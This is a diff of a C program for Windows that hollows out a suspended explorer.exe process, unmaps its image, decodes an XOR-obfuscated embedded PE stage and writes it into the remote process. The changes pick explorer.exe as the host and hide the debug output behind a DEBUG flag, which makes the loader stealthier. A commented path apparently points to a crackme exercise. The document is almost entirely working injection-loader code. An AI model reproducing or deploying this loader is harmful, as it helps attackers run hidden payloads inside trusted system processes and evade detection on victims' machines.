@@ -65,7 +65,7 @@ int main(int argc, char* argv[], char* envp[])
 	startinfo.cb = sizeof(startinfo);
 	PROCESS_INFORMATION processinfo;
 	memset(&processinfo, 0, sizeof(processinfo));	
-	if (!CreateProcess(/*"C:\\Windows\\System32\\calc.exe"*/argv[0], "", NULL, NULL, 0, CREATE_SUSPENDED, NULL, NULL, &startinfo, &processinfo))
+	if (!CreateProcess(/*"C:\\Windows\\System32\\calc.exe"*/"C:\\Windows\\explorer.exe", "", NULL, NULL, 0, CREATE_SUSPENDED, NULL, NULL, &startinfo, &processinfo))
 	{
 #ifdef DEBUG
 		printf("[-] CreateProcess\n");
@@ -75,7 +75,9 @@ int main(int argc, char* argv[], char* envp[])
 	}
 	//HANDLE hprocess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processinfo.dwProcessId);
 	ctx.ContextFlags = CONTEXT_FULL;
+#ifdef DEBUG
 	printf("hprocess=%p\n",processinfo.hProcess);
+#endif
 	if (!GetThreadContext(processinfo.hThread, &ctx))
 	{
 #ifdef DEBUG
@@ -85,7 +87,9 @@ int main(int argc, char* argv[], char* envp[])
 		ExitProcess(1);
 	}
 	PVOID imagebase;
+#ifdef DEBUG
 	printf("PEB = %p\n", ctx.Rdx);
+#endif
 	if (!ReadProcessMemory(processinfo.hProcess, (LPCVOID) ctx.Rdx, (LPVOID)&peb, sizeof(peb), NULL))
 	{
 #ifdef DEBUG
@@ -95,32 +99,28 @@ int main(int argc, char* argv[], char* envp[])
 		ExitProcess(1);
 	}
 	imagebase = peb.Reserved3[1];
+#ifdef DEBUG
 	printf("[+] main module = %p\n", imagebase);
+#endif
 	NtUnmapViewOfSection_fun = (NtUnmapViewOfSection) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtUnmapViewOfSection");
+#ifdef DEBUG
 	printf("[+] NtUnmapViewOfSection = %p\n", NtUnmapViewOfSection_fun);
-	//NtUnmapViewOfSection_fun(hprocess, (PVOID) imagebase);
-	//printf("RAX=%p\nRBX=%p\nRCX=%p\nRDX=%p\nRSP=%p\nRBP=%p\nRSI=%p\nRDI=%p\nRIP=%p\nr8=%p\nr9=%p\nr10=%p\nr11=%p\nr12=%p\nr13=%p\nr14=%p\nr15=%p\n",
-	//        ctx.Rax,ctx.Rbx,ctx.Rcx,ctx.Rdx,ctx.Rsp,ctx.Rbp,ctx.Rsi,ctx.Rdi,ctx.Rip,ctx.R8,ctx.R9,ctx.R10,ctx.R11,ctx.R12,ctx.R13,ctx.R14,ctx.R15);
-	// get main module address of the created process
-    /*
-	if (NtUnmapViewOfSection_fun(processinfo.hProcess, (PVOID) imagebase))
-	{
-		//printf("[-] NtUnmapViewOfSection imagebase\n");
-		MYERR;
-		return 1;
-	}*/
-	//printf("[+] unmapped\n");
-	printf("Unmapview at %p\n", imagebase);
+	printf("Imagebase at %p\n", imagebase);
+#endif
 	LPSTR mem;//loadfile("C:\\Users\\Redouane\\Desktop\\Work\\infosec\\megacrackme\\crackme.exe");
 	int size_stage = load_stage(&mem);
 	for (int i = 0; i < size_stage; i++)
 	{
 		mem[i] = (mem[i] + 99) ^ 0x2f;
 	}
+#ifdef DEBUG
 	printf("Loaded stage of size %u\n", size_stage);
+#endif
 	PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER) mem;
 	PIMAGE_NT_HEADERS64 nt_header = (PIMAGE_NT_HEADERS64) ((__int64)mem + dos_header->e_lfanew);
+#ifdef DEBUG
 	printf("[?] Number of sections : %d\n", nt_header->FileHeader.NumberOfSections);
+#endif
 	if (imagebase == nt_header->OptionalHeader.ImageBase)
 		if (NtUnmapViewOfSection_fun(processinfo.hProcess, (PVOID)imagebase))
 		{
@@ -130,8 +130,10 @@ int main(int argc, char* argv[], char* envp[])
 #endif
 		  ExitProcess(1);
 		}
+#ifdef DEBUG
 	printf("sizeof(image) = %p\n", nt_header->OptionalHeader.SizeOfImage);
 	printf("? imagebase = %p\n", imagebase);
+#endif
 	LPVOID new_imagebase = VirtualAllocEx(
 		processinfo.hProcess,
 		(PVOID)nt_header->OptionalHeader.ImageBase,
@@ -147,7 +149,9 @@ int main(int argc, char* argv[], char* envp[])
 #endif
 		ExitProcess(1);
 	}
+#ifdef DEBUG
 	printf("[?] new_imagebase = %p\n", new_imagebase);
+#endif
 	if (!WriteProcessMemory(processinfo.hProcess, new_imagebase, mem, nt_header->OptionalHeader.SizeOfHeaders, NULL))
 	{
 #ifdef DEBUG
